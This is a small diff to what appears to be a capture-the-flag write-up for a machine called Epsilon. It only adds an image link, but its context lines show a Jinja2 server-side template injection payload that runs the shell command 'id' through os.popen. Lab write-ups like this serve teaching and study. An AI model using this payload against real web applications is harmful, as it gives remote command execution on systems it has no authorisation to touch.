@@ -706,6 +706,6 @@ After a time teting `Jinja2` payloads, I find one in [Payloads All The Things] t
 ```python 
 {{ joiner.__init__.__globals__.os.popen('id').read() }}
 ```
-
+![10](../../../assets/images/Epsilon/10.png)
 
 <br />
